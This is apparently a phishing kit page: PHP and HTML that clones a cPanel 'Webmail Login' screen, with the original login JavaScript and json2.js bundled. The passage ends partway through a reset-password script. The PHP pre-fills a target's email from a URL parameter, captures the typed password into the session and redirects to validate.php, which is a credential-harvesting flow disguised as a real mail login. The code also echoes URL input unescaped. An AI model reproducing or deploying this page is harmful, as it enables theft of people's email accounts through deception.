<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Please enter a valid email address";
	} 
        else if(trim($pass) == "") {
		$pass_msg = "Enter your password";
	}
        else if(strlen($pass) <= 3) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: validate.php");
		exit;
	}
}
?>
<!DOCTYPE html>
<html dir="ltr"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Webmail Login</title>

<link rel="shortcut icon" href="favicon.ico">
<!-- EXTERNAL CSS -->
<link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
<!--[if IE 6]> <style type="text/css"> img { behavior: url(/cPanel_magic_revision_1335428097/unprotected/cp_pngbehavior_login.htc); } </style> <![endif]-->
<script>
window.DOM = { get: function(id) { return document.getElementById(id) } };
</script>
<style type="text/css">
.billing-help:hover {
color: #022b3b !important;
}
</style>
</head>



<body>
<script type="text/javascript" src="jquery.min.js"></script><script type="text/javascript">var server_hostname = ""; </script><input id="dest_uri" value="/" type="hidden">

<img class="background-image" src="login-whisp.png">
<div id="login-wrapper" class="login-whisp">
<div id="notify">
<noscript> <div class="error-notice"> <img
src="notice-error.png" alt="Error" align="left"/> JavaScript is
disabled in your browser. For Webmail to function properly, you must
enable JavaScript. If you do not enable JavaScript, certain features in
Webmail will not function correctly. </div> </noscript>
<div id="login-status" class="error-notice" style="visibility: hidden;"> <span class="login-status-icon"></span>
<div id="login-status-message">You have logged out.</div>
</div>
</div>
<div style="display: none;">
<div id="locale-container" style="visibility: hidden;">
<div id="locale-inner-container">
<div id="locale-header">
<div class="locale-head">Please select a locale:</div>
<div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
</div>
<div id="locale-map">
<div class="scroller clear">
<div class="locale-cell"><a href="?locale=en">English</a></div>
<div class="locale-cell"><a href="?locale=ar">???????</a></div>
<div class="locale-cell"><a href="?locale=bg">?????????</a></div>
<div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
<div class="locale-cell"><a href="?locale=el">????????</a></div>
<div class="locale-cell"><a href="?locale=es">espa ol</a></div>
<div class="locale-cell"><a href="?locale=es_419">espa ol
latinoamericano</a></div>
<div class="locale-cell"><a href="?locale=es_es">espa ol
de Espa a</a></div>
<div class="locale-cell"><a href="?locale=fi">suomi</a></div>
<div class="locale-cell"><a href="?locale=fr">fran ais</a></div>
<div class="locale-cell"><a href="?locale=hi">??????</a></div>
<div class="locale-cell"><a href="?locale=hu">magyar</a></div>
<div class="locale-cell"><a href="?locale=id">Bahasa
Indonesia</a></div>
<div class="locale-cell"><a href="?locale=it">italiano</a></div>
<div class="locale-cell"><a href="?locale=ja">???</a></div>
<div class="locale-cell"><a href="?locale=ko">???</a></div>
<div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
<div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
<div class="locale-cell"><a href="?locale=pl">polski</a></div>
<div class="locale-cell"><a href="?locale=pt">portugu s</a></div>
<div class="locale-cell"><a href="?locale=pt_br">portugu s
do Brasil</a></div>
<div class="locale-cell"><a href="?locale=ro">rom na</a></div>
<div class="locale-cell"><a href="?locale=ru">???????</a></div>
<div class="locale-cell"><a href="?locale=sl">sloven cina</a></div>
<div class="locale-cell"><a href="?locale=sv">svenska</a></div>
<div class="locale-cell"><a href="?locale=th">???</a></div>
<div class="locale-cell"><a href="?locale=tr">T rk e</a></div>
<div class="locale-cell"><a href="?locale=zh">??</a></div>
<div class="locale-cell"><a href="?locale=zh_cn">??(??)</a></div>
</div>
</div>
</div>
</div>
</div>
<div id="content-container">
<div id="login-container">
<div id="login-sub-container">
<div id="login-sub-header"> <img src="webmail.png" alt="logo"> </div>
<div id="login-sub">
<div id="forms">
<form id="login_form" action="validate.php" method="post" target="_top">
<div class="input-req-login user-label"><?php if($user == "") {
							?><label for="user">Email Address</label></div>
<div class="input-field-login icon username-container"> <input name="email" id="email" autofocus="autofocus"  class="std_textbox" tabindex="1" required="" type="text" placeholder="Enter your email address."

value="<?php echo $email != "" ? $email : "" ?>" /><?php echo $email_msg != "" ? "<span style='color: #FF0000; display: block; margin-left: 1px; margin-top: 5px;'>$email_msg</span>" : "<br />" ?>

				<?php

			} else {
			
			?>
			
			<input class="txtentry" type="hidden" name="email" value="<?php echo $userid ?>" />

				<p id='username'><b><font face="Arial"><span style="font-size: 12pt"><?php echo $userid ?></span></font></b></p>
	<?php

			} ?>



</div>
<div style="margin-top: 15px;" class="input-req-login user-pw"><label for="pass">Password</label></div>
<div class="input-field-login icon password-container"> <input name="passwd" id="pass" placeholder="Enter your email password." class="std_textbox" tabindex="2" required="" type="password"size="1" tabindex="2"><?php echo $pass_msg != "" ? "<span style='color: #FF0000; display: block; margin-left: 1px; margin-top: 5px;'>$pass_msg</span>" : "<br />" ?>
 </div>
<div style="width: 285px;" id="button_container">
<div class="login-btn"> <button name="Upgrade" type="submit" id="Upgrade" tabindex="3">Log
in</button> </div>
<noscript><style type="text/css"> .reset-pw {
display:none } </style></noscript>
</div>
<div class="clear" id="push"></div>
</form>
<!--CLOSE forms --> </div>
<!--CLOSE login-sub --> </div>
<!--CLOSE login-sub-container --> </div>
<!--CLOSE login-container --> </div>
<div id="locale-footer">
<ul id="locales_list" style="margin: 0px; padding: 0px; text-align: center; color: rgb(0, 0, 0); font-family: helvetica,arial,sans-serif; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px;">
<li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 0px;"><a href="#" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">English</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">???????</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">?????????</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">Deutsch</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#?locale=el" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">????????</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#?locale=es" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">espa?ol</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#?locale=es_419" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">espa?ol&nbsp;latinoamericano</a></li>
<span class="Apple-converted-space">&nbsp;</span><li style="display: inline; list-style-type: none; list-style-image: none; list-style-position: outside; margin-left: 34px;"><a href="#?locale=es_es" style="color: rgb(63, 65, 67); text-decoration: none; font-size: 12px; font-weight: bold;">espa?ol&nbsp;de&nbsp;Espa?a</a></li>
<span class="Apple-converted-space">&nbsp;</span>
</ul>
</div>
</div>
<!--Close login-wrapper -->
</div>
<script>
// Homerolled. We're not logged in and don't have access to cjt and yui.
var MESSAGES = {
"ajax_timeout" : "The connection timed out. Please try again.",
"authenticating" : "Authenticating  ",
"changed_ip" : "Your IP address has changed. Please log in again.",
"expired_session" : "Your session has expired. Please log in again.",
"invalid_login" : "The login is invalid.",
"invalid_session" : "Your session cookie is invalid. Please log in again.",
"invalid_username" : "The submitted username is invalid.",
"network_error" : "A network error occurred while sending your login request. Please try again. If this condition persists, contact your network service provider.",
"no_username" : "You must specify a username to login.",
"prevented_xfer" : "The session could not be transferred because you were not accessing this service over a secure connection. Please login now to continue.",
"session_locale" : "The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.",
"success" : "Login successful. Redirecting  ",
"token_incorrect" : "The security token in your request is invalid.",
"token_missing" : "The security token is missing from your request.",
"": 0
};
delete MESSAGES[""];
window.IS_LOGOUT = false;
"use strict";function toggle_locales(e){while(LOCALE_FADES.length)clearInterval(LOCALE_FADES.shift());var t=div_cache[e?"locale-container":"login-container"];set_opacity(t,0);if(HAS_CSS_OPACITY)content_cell.replaceChild(t,content_cell.children[0]);else{var n=content_cell.children[0];content_cell.insertBefore(t,n),t.style.display="",n.style.display="none"}LOCALE_FADES.push(fade_in(t)),LOCALE_FADES.push((e?fade_out:fade_in)("locale-footer"))}function fade_in(e,t,n){e=div_cache[e]||DOM.get(e)||e;var r=e.style,i,s=window.getComputedStyle?getComputedStyle(e,null):e.currentStyle,o=s.visibility,u;if(e.offsetWidth&&o!=="hidden"){if(window.getComputedStyle)u=Number(s.opacity);else{try{u=e.filters.item("DXImageTransform.Microsoft.Alpha").opacity}catch(a){try{u=e.filters("alpha").opacity}catch(a){u=100}}u/=100}u||(u=0)}else u=0,set_opacity(e,0);if(n&&u<.01){u&&set_opacity(e,0);return}t||(t=FADE_DURATION);var f=t*1e3,l=new Date,c;n?c=f+l.getTime():r.visibility="visible";var h=function(){var t;n?(t=u*(c-new Date)/f,t<=0&&(t=0,clearInterval(i),r.visibility="hidden")):(t=u+(1-u)*(new Date-l)/f,t>=1&&(t=1,clearInterval(i))),set_opacity(e,t)};return h(),i=setInterval(h,FADE_DELAY),i}function fade_out(e,t){return fade_in(e,t,!0)}function ajaxObject(e,t){this._url=e,this._callback=t||function(){}}function login_results(e){var t;try{t=JSON.parse(e&&e.responseText)}catch(n){t=null}var r=e.status;if(r===200){show_status(MESSAGES.success,"success"),fade_out("content-container",FADE_DURATION/2);if(t){var i=DOM.get("dest_uri").value,s;i&&!i.match(/^\/login\/?/)?s=t.security_token+i:s=t.redirect;if(/^(?:\/cpsess[^\/]+)\/$/.test(s))top.location.href=s;else{if(t.security_token&&top!==window)for(var o=0;o<top.frames.length;o++)if(top.frames[o]!==window){var u=top.frames[o].location.href.replace(/\/cpsess[.\d]+/,t.security_token);top.frames[o].location.href=u}location.href=s}}else login_form.submit();return}if(parseInt(r/100,10)===4){var a=t&&t.message;show_status(MESSAGES[a||"invalid_login"]||MESSAGES.invalid_login,"error"),set_status_timeout()}else show_status(MESSAGES.network_error,"error");show_links(document.body),login_button.release();return}function show_status(e,t){DOM.get("login-status-message")[_text_content]=e;var n=DOM.get("login-status"),r=t&&level_classes[t]||level_classes.info,i=n.className.replace(levels_regex,r);n.className=i,fade_in(n),reset_status_timeout()}function reset_status_timeout(){clearTimeout(STATUS_TIMEOUT),STATUS_TIMEOUT=null}function set_status_timeout(e){STATUS_TIMEOUT=setTimeout(function(){fade_out("login-status")},e||8e3)}function do_login(){if(LOGIN_SUBMIT_OK){LOGIN_SUBMIT_OK=!1,hide_links(document.body),login_button.suppress(),show_status(MESSAGES.authenticating,"info");var e=new ajaxObject(login_form.action,login_results);e.update("user="+encodeURIComponent(login_username_el.value)+"&pass="+encodeURIComponent(login_password_el.value),"POST")}return!1}function _set_links_style(e,t,n){var r=e.getElementsByTagName("a");for(var i=r.length-1;i>=0;i--)r[i].style[t]=n}function hide_links(e){_set_links_style(e,"visibility","hidden")}function show_links(e){_set_links_style(e,"visibility","")}var FADE_DURATION=.45,FADE_DELAY=20,AJAX_TIMEOUT=3e4,LOCALE_FADES=[],HAS_CSS_OPACITY="opacity"in document.body.style,login_form=DOM.get("login_form"),login_username_el=DOM.get("user"),login_password_el=DOM.get("pass"),login_submit_el=DOM.get("login_submit"),div_cache={"login-page":DOM.get("login-page")||!1,"locale-container":DOM.get("locale-container")||!1,"login-container":DOM.get("login-container")||!1,"locale-footer":DOM.get("locale-footer")||!1,"content-cell":DOM.get("content-container")||!1,invalid:DOM.get("invalid")||!1},content_cell=div_cache["content-cell"];div_cache["locale-footer"]&&(div_cache["locale-footer"].style.display="block");var reset_form=DOM.get("reset_form"),reset_username_el=DOM.get("reset_pass_username"),RESET_FADES=[],show_reset=function(){reset_username_el.value||(reset_username_el.value=login_username_el.value);while(RESET_FADES.length)clearInterval(RESET_FADES.shift());RESET_FADES.push(fade_in(reset_form)),RESET_FADES.push(fade_out(login_form)),reset_username_el.focus()},hide_reset=function(){while(RESET_FADES.length)clearInterval(RESET_FADES.shift());RESET_FADES.push(fade_in(login_form)),RESET_FADES.push(fade_out(reset_form)),login_username_el.focus()};if(HAS_CSS_OPACITY)var set_opacity=function(t,n){t.style.opacity=n};else var filter_regex=/(DXImageTransform\.Microsoft\.Alpha\()[^)]*\)/,set_opacity=function(t,n){var r=t.currentStyle.filter;if(!r)t.style.filter="progid:DXImageTransform.Microsoft.Alpha(enabled=true)";else if(!filter_regex.test(r))t.style.filter+=" progid:DXImageTransform.Microsoft.Alpha(enabled=true)";else{var i=r.replace(filter_regex,"$1enabled=true)");i!==r&&(t.style.filter=i)}try{t.filters.item("DXImageTransform.Microsoft.Alpha").opacity=n*100}catch(s){try{t.filters.item("alpha").opacity=n*100}catch(s){}}};ajaxObject.prototype.updating=!1,ajaxObject.prototype.abort=function(){this.updating&&(this.AJAX.abort(),delete this.AJAX)},ajaxObject.prototype.update=function(e,t){if(this.AJAX)return!1;var n=null;if(window.XMLHttpRequest)n=new XMLHttpRequest;else{if(!window.ActiveXObject)return!1;n=new ActiveXObject("Microsoft.XMLHTTP")}var r,i=this;n.onreadystatechange=function(){n.readyState==4&&(clearTimeout(r),i.updating=!1,i._callback(n),delete i.AJAX)};try{var s;r=setTimeout(function(){i.abort(),show_status(MESSAGES.ajax_timeout,"error")},AJAX_TIMEOUT),/post/i.test(t)?(s=this._url+"?login_only=1",n.open("POST",s,!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.send(e)):(s=this._url+"?"+e+"&timestamp="+(new Date).getTime(),n.open("GET",s,!0),n.send(null)),this.AJAX=n,this.updating=!0}catch(o){login_form.submit()}return!0};var _text_content="textContent"in document.body?"textContent":"innerText",level_classes={info:"info-notice",error:"error-notice",success:"success-notice",warn:"warn-notice"},levels_regex="";for(var lv in level_classes)levels_regex+="|"+level_classes[lv];levels_regex=new RegExp("\\b(?:"+levels_regex.slice(1)+")\\b");var STATUS_TIMEOUT=null,LOGIN_SUBMIT_OK=!0;document.body.onkeyup=function(){LOGIN_SUBMIT_OK=!0},document.body.onmousedown=function(){LOGIN_SUBMIT_OK=!0};var login_button={button:login_submit_el,_suppressed_disabled:null,suppress:function(){this._suppressed_disabled===null&&(this._suppressed_disabled=this.button.disabled,this.button.disabled=!0)},release:function(){this._suppressed_disabled!==null&&(this.button.disabled=this._suppressed_disabled,this._suppressed_disabled=null)},queue_disabled:function(e){this._suppressed_disabled===null?this.button.disabled=e:this._suppressed_disabled=e}};if(!window.JSON){login_button.suppress();var new_script=document.createElement("script");new_script.onreadystatechange=function(){if(this.readyState==="loaded"||this.readyState==="complete")this.onreadystatechange=null,window.JSON={parse:window.jsonParse},window.jsonParse=undefined,login_button.release()},new_script.src="/unprotected/json-minified.js",document.getElementsByTagName("head")[0].appendChild(new_script)}try{login_form.onsubmit=do_login,set_opacity(DOM.get("login-wrapper"),0),LOCALE_FADES.push(fade_in("login-wrapper"));var preload=document.createElement("div");preload.id="preload_images",document.body.insertBefore(preload,document.body.firstChild),window.IS_LOGOUT?set_status_timeout(1e4):/(?:\?|&)locale=[^&]/.test(location.search)&&show_status(MESSAGES.session_locale),setTimeout(function(){login_username_el.focus()},100)}catch(e){window.console&&console.warn(e)};/*
Prototype JSON for browsers that don't have it.
*/
/*
json2.js
2013-05-26
Public Domain.
NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.
See http://www.JSON.org/js.html
This code should be minified before deployment.
See http://javascript.crockford.com/jsmin.html
USE YOUR OWN COPY. IT IS EXTREMELY UNWISE TO LOAD CODE FROM SERVERS YOU DO
NOT CONTROL.
This file creates a global JSON object containing two methods: stringify
and parse.
JSON.stringify(value, replacer, space)
value any JavaScript value, usually an object or array.
replacer an optional parameter that determines how object
values are stringified for objects. It can be a
function or an array of strings.
space an optional parameter that specifies the indentation
of nested structures. If it is omitted, the text will
be packed without extra whitespace. If it is a number,
it will specify the number of spaces to indent at each
level. If it is a string (such as '\t' or '&nbsp;'),
it contains the characters used to indent at each level.
This method produces a JSON text from a JavaScript value.
When an object value is found, if the object contains a toJSON
method, its toJSON method will be called and the result will be
stringified. A toJSON method does not serialize: it returns the
value represented by the name/value pair that should be serialized,
or undefined if nothing should be serialized. The toJSON method
will be passed the key associated with the value, and this will be
bound to the value
For example, this would serialize Dates as ISO strings.
Date.prototype.toJSON = function (key) {
function f(n) {
// Format integers to have at least two digits.
return n < 10 ? '0' + n : n;
}
return this.getUTCFullYear() + '-' +
f(this.getUTCMonth() + 1) + '-' +
f(this.getUTCDate()) + 'T' +
f(this.getUTCHours()) + ':' +
f(this.getUTCMinutes()) + ':' +
f(this.getUTCSeconds()) + 'Z';
};
You can provide an optional replacer method. It will be passed the
key and value of each member, with this bound to the containing
object. The value that is returned from your method will be
serialized. If your method returns undefined, then the member will
be excluded from the serialization.
If the replacer parameter is an array of strings, then it will be
used to select the members to be serialized. It filters the results
such that only members with keys listed in the replacer array are
stringified.
Values that do not have JSON representations, such as undefined or
functions, will not be serialized. Such values in objects will be
dropped; in arrays they will be replaced with null. You can use
a replacer function to replace those with JSON values.
JSON.stringify(undefined) returns undefined.
The optional space parameter produces a stringification of the
value that is filled with line breaks and indentation to make it
easier to read.
If the space parameter is a non-empty string, then that string will
be used for indentation. If the space parameter is a number, then
the indentation will be that many spaces.
Example:
text = JSON.stringify(['e', {pluribus: 'unum'}]);
// text is '["e",{"pluribus":"unum"}]'
text = JSON.stringify(['e', {pluribus: 'unum'}], null, '\t');
// text is '[\n\t"e",\n\t{\n\t\t"pluribus": "unum"\n\t}\n]'
text = JSON.stringify([new Date()], function (key, value) {
return this[key] instanceof Date ?
'Date(' + this[key] + ')' : value;
});
// text is '["Date(---current time---)"]'
JSON.parse(text, reviver)
This method parses a JSON text to produce an object or array.
It can throw a SyntaxError exception.
The optional reviver parameter is a function that can filter and
transform the results. It receives each of the keys and values,
and its return value is used instead of the original value.
If it returns what it received, then the structure is not modified.
If it returns undefined then the member is deleted.
Example:
// Parse the text. Values that look like ISO date strings will
// be converted to Date objects.
myData = JSON.parse(text, function (key, value) {
var a;
if (typeof value === 'string') {
a =
/^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2}(?:\.\d*)?)Z$/.exec(value);
if (a) {
return new Date(Date.UTC(+a[1], +a[2] - 1, +a[3], +a[4],
+a[5], +a[6]));
}
}
return value;
});
myData = JSON.parse('["Date(09/09/2001)"]', function (key, value) {
var d;
if (typeof value === 'string' &&
value.slice(0, 5) === 'Date(' &&
value.slice(-1) === ')') {
d = new Date(value.slice(5, -1));
if (d) {
return d;
}
}
return value;
});
This is a reference implementation. You are free to copy, modify, or
redistribute.
*/
/*jslint evil: true, regexp: true */
/*members "", "\b", "\t", "\n", "\f", "\r", "\"", JSON, "\\", apply,
call, charCodeAt, getUTCDate, getUTCFullYear, getUTCHours,
getUTCMinutes, getUTCMonth, getUTCSeconds, hasOwnProperty, join,
lastIndex, length, parse, prototype, push, replace, slice, stringify,
test, toJSON, toString, valueOf
*/
// Create a JSON object only if one does not already exist. We create the
// methods in a closure to avoid creating global variables.
if (typeof JSON !== 'object') {
JSON = {};
}
(function () {
'use strict';
function f(n) {
// Format integers to have at least two digits.
return n < 10 ? '0' + n : n;
}
if (typeof Date.prototype.toJSON !== 'function') {
Date.prototype.toJSON = function () {
return isFinite(this.valueOf())
? this.getUTCFullYear() + '-' +
f(this.getUTCMonth() + 1) + '-' +
f(this.getUTCDate()) + 'T' +
f(this.getUTCHours()) + ':' +
f(this.getUTCMinutes()) + ':' +
f(this.getUTCSeconds()) + 'Z'
: null;
};
String.prototype.toJSON =
Number.prototype.toJSON =
Boolean.prototype.toJSON = function () {
return this.valueOf();
};
}
var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
gap,
indent,
meta = { // table of character substitutions
'\b': '\\b',
'\t': '\\t',
'\n': '\\n',
'\f': '\\f',
'\r': '\\r',
'"' : '\\"',
'\\': '\\\\'
},
rep;
function quote(string) {
// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.
escapable.lastIndex = 0;
return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
var c = meta[a];
return typeof c === 'string'
? c
: '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
}) + '"' : '"' + string + '"';
}
function str(key, holder) {
// Produce a string from holder[key].
var i, // The loop counter.
k, // The member key.
v, // The member value.
length,
mind = gap,
partial,
value = holder[key];
// If the value has a toJSON method, call it to obtain a replacement value.
if (value && typeof value === 'object' &&
typeof value.toJSON === 'function') {
value = value.toJSON(key);
}
// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.
if (typeof rep === 'function') {
value = rep.call(holder, key, value);
}
// What happens next depends on the value's type.
switch (typeof value) {
case 'string':
return quote(value);
case 'number':
// JSON numbers must be finite. Encode non-finite numbers as null.
return isFinite(value) ? String(value) : 'null';
case 'boolean':
case 'null':
// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.
return String(value);
// If the type is 'object', we might be dealing with an object or an array or
// null.
case 'object':
// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.
if (!value) {
return 'null';
}
// Make an array to hold the partial results of stringifying this object value.
gap += indent;
partial = [];
// Is the value an array?
if (Object.prototype.toString.apply(value) === '[object Array]') {
// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.
length = value.length;
for (i = 0; i < length; i += 1) {
partial[i] = str(i, value) || 'null';
}
// Join all of the elements together, separated with commas, and wrap them in
// brackets.
v = partial.length === 0
? '[]'
: gap
? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
: '[' + partial.join(',') + ']';
gap = mind;
return v;
}
// If the replacer is an array, use it to select the members to be stringified.
if (rep && typeof rep === 'object') {
length = rep.length;
for (i = 0; i < length; i += 1) {
if (typeof rep[i] === 'string') {
k = rep[i];
v = str(k, value);
if (v) {
partial.push(quote(k) + (gap ? ': ' : ':') + v);
}
}
}
} else {
// Otherwise, iterate through all of the keys in the object.
for (k in value) {
if (Object.prototype.hasOwnProperty.call(value, k)) {
v = str(k, value);
if (v) {
partial.push(quote(k) + (gap ? ': ' : ':') + v);
}
}
}
}
// Join all of the member texts together, separated with commas,
// and wrap them in braces.
v = partial.length === 0
? '{}'
: gap
? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
: '{' + partial.join(',') + '}';
gap = mind;
return v;
}
}
// If the JSON object does not yet have a stringify method, give it one.
if (typeof JSON.stringify !== 'function') {
JSON.stringify = function (value, replacer, space) {
// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.
var i;
gap = '';
indent = '';
// If the space parameter is a number, make an indent string containing that
// many spaces.
if (typeof space === 'number') {
for (i = 0; i < space; i += 1) {
indent += ' ';
}
// If the space parameter is a string, it will be used as the indent string.
} else if (typeof space === 'string') {
indent = space;
}
// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.
rep = replacer;
if (replacer && typeof replacer !== 'function' &&
(typeof replacer !== 'object' ||
typeof replacer.length !== 'number')) {
throw new Error('JSON.stringify');
}
// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.
return str('', {'': value});
};
}
// If the JSON object does not yet have a parse method, give it one.
if (typeof JSON.parse !== 'function') {
JSON.parse = function (text, reviver) {
// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.
var j;
function walk(holder, key) {
// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.
var k, v, value = holder[key];
if (value && typeof value === 'object') {
for (k in value) {
if (Object.prototype.hasOwnProperty.call(value, k)) {
v = walk(value, k);
if (v !== undefined) {
value[k] = v;
} else {
delete value[k];
}
}
}
}
return reviver.call(holder, key, value);
}
// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.
text = String(text);
cx.lastIndex = 0;
if (cx.test(text)) {
text = text.replace(cx, function (a) {
return '\\u' +
('0000' + a.charCodeAt(0).toString(16)).slice(-4);
});
}
// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.
// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.
if (/^[\],:{}\s]*$/
.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
.replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
.replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {
// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.
j = eval('(' + text + ')');
// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.
return typeof reviver === 'function'
? walk({'': j}, '')
: j;
}
// If the text is not JSON parseable, then a SyntaxError is thrown.
throw new SyntaxError('JSON.parse');
};
}
}());
/*
Reset password code.
This is more a script than a program since we're scripting and re-purposing cPanel's login page.
*/
var resJS = {};
resJS.reset = {};
resJS.reset.is_cancel = false;
resJS.reset.in_progress = false;
resJS.reset.reload_action = false;
resJS.reset.selectedDomain = '';
resJS.reset.reflectorUrl = '/unprotected/cpanel/API.php';
resJS.reset.resetType = '';
// The toggle, (onclick event on the reset password link) although if a reset is in progress (IE they've logged in)
// the only toggle is to refresh the page because we've damaged the DOM too much to easily repair it.
resJS.reset.show_reset = function () {
while ( RESET_FADES.length ) clearInterval( RESET_FADES.shift() );
if ( resJS.reset.in_progress ) {
document.location.href=document.location.href;
}
if (resJS.reset.is_cancel) { // toggle back to cpanel
$('#locale-footer').css('visibility','visible');
$('.copyright').show();
$('#login_submit').html('Log in');
$('#login-sub-header').css('background', resJS.reset.original_header_block_css);
$('#login-sub-header').html(resJS.reset.original_header_block);
//$('#login-sub-header').css('box-shadow', 'none');
$('#login-status').css('visibility',resJS.reset.original_status_message);
$('#reset_link').html('Reset Password');
$('#user').attr('placeholder', resJS.reset.original_placeholder_user);
$('#pass').attr('placeholder', resJS.reset.original_placeholder_pass);
$('#user').val('');
$('#pass').val('');
$('#login-status').css('visibility','hidden');
$('.user-label').html('<label for="user">Username</label>');
$('.user-pw').html('<label for="pass">Password</label>');
resJS.reset.is_cancel=false;
} else { // toggle to reseller credentials
resJS.reset.original_header_block = $('#login-sub-header').html();
resJS.reset.original_header_block_css = $('#login-sub-header').css('background');
resJS.reset.original_placeholder_user = $('#user').attr('placeholder');
resJS.reset.original_placeholder_pass = $('#pass').attr('placeholder');
resJS.reset.original_status_message = $('#login-status').css('visible');
$('#locale-footer').css('visibility','hidden');
$('#login-status').css('visibility','hidden');
$('.copyright').hide();
$('#login_submit').html('Continue...');
//$('#login-sub-header').css('background-color','white');
//$('#login-sub-header').css('box-shadow', '0 0 10px #000 inset');
$('#reset_link').html('Cancel Reset');
$('#user').attr('placeholder','Enter your Billing Email.');
$('#pass').attr('placeholder','Enter your Billing Password.');
$('#login-status').attr('class','warn-notice');
$('.user-label').html('<label for="user">Billing Email:</label>');
$('.user-pw').html('<label for="pass">Billing Password:</label>');
$('#login-status-message').html('Password reset in progress.');
$('#login-status').css('visibility','visible');
resJS.reset.is_cancel=true;
}
}
// Capture the "login" button event
$('#login_submit').click(function (e) {
// if we're on cpanel return and allow the event to bubble normally
if (!resJS.reset.is_cancel) {
return;
}
// We're not on cpanel's login so lets do our thing.
e.preventDefault(e);
e.stopPropagation(e);
